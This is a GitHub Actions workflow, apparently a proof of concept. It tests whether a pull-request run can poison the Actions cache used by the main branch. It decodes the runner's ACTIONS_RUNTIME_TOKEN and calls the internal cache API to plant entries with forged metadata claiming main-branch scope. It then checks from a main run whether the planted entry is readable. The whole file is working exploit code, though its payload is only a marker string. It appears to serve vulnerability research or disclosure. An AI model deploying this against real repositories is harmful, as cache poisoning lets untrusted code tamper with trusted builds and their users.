name: scope-probe
on:
  push:
  pull_request:
  workflow_dispatch:
permissions: {}
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const t = process.env.ACTIONS_RUNTIME_TOKEN || '';
            const results = process.env.ACTIONS_RESULTS_URL || '';
            const claims = JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString());
            const rid = String(claims.repository_id);
            core.info(`event=${context.eventName} ref=${context.ref}`);
            core.info(`ac = ${JSON.stringify(claims.ac)}`);
            const VER = 'b'.repeat(64);
            const call = async (m, body) => {
              const r = await fetch(`${results}twirp/github.actions.results.api.v1.CacheService/${m}`,
                { method:'POST', headers:{Authorization:`Bearer ${t}`,'Content-Type':'application/json'},
                  body: JSON.stringify(body) });
              return { status: r.status, txt: await r.text() };
            };
            // plant = reserve + upload + finalize, optionally with forged metadata
            const plant = async (key, meta, label) => {
              const body = { key, version: VER };
              if (meta) body.metadata = meta;
              const c = await call('CreateCacheEntry', body);
              let url = null; try { url = JSON.parse(c.txt).signed_upload_url } catch {}
              if (!url) { core.info(`[plant ${label}] reserve FAILED ${c.status} ${c.txt.slice(0,160)}`); return; }
              const payload = `POISON-FROM-PR-${label}`;
              const up = await fetch(url, { method:'PUT',
                headers:{ 'x-ms-blob-type':'BlockBlob', 'Content-Type':'application/octet-stream' },
                body: payload });
              const fbody = { key, version: VER, size_bytes: String(payload.length) };
              if (meta) fbody.metadata = meta;
              const f = await call('FinalizeCacheEntryUpload', fbody);
              core.info(`[plant ${label}] reserve=${c.status} upload=${up.status} finalize=${f.status} ${f.txt.slice(0,160)}`);
            };
            const read = async (key, label) => {
              const r = await call('GetCacheEntryDownloadURL', { key, restore_keys: [], version: VER });
              let ok=false, mk=''; try { const j=JSON.parse(r.txt); ok=j.ok; mk=j.matched_key||'' } catch {}
              core.info(`[read ${label}] HTTP ${r.status} ok=${ok} matched_key="${mk}"`);
              return ok;
            };
            const FORGED = { repository_id: rid, scope: [{ scope: 'refs/heads/main', permission: '3' }] };
            if (context.eventName === 'pull_request') {
              core.info('--- PR plants two entries ---');
              await plant('PR-PLANTED-FORGED',  FORGED, 'FORGED');   // forged scope=refs/heads/main
              await plant('PR-PLANTED-CONTROL', null,   'CONTROL');  // benign equivalent, no metadata
            } else {
              core.info('--- main-scope run tries to read what the PR planted ---');
              const a = await read('PR-PLANTED-FORGED',  'FORGED  (poisoning if ok=true)');
              const b = await read('PR-PLANTED-CONTROL', 'CONTROL (expected ok=false)');
              core.info(`VERDICT: forged_readable=${a} control_readable=${b}`);
              if (a && !b) core.setFailed('SCOPE BYPASS: forged metadata placed the entry in the main scope');
            }
